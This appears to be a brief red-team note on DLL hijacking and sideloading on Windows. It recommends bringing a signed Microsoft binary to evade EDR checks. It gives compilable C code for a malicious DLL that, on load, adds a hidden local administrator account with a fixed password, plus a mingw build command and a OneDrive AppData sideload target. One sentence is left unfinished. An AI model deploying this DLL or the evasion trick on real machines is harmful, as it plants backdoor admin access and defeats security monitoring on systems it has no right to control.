# DLL Hijack/Sideloading
<https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking>
The following code can be used to create a malicious DLL:

Bring your own vulnerable signed MS binary:

OLEVIEW

Why? EDR's will check if dll's loaded by LOL windows binaries happen from the right directory - by dropping a signed binary that is not present on the file system, we evding that detection.

Additionally OLEVIEW will

```csharp
#include <windows.h>
 
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user localadmin Password1 /add");
        system("cmd.exe /k net localgroup administrators localadmin /add");
        ExitProcess(0);
    }
    return TRUE;
}
```
Compile with:

```code
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll
```

onedrive -> Appdata -> cscapi.dll
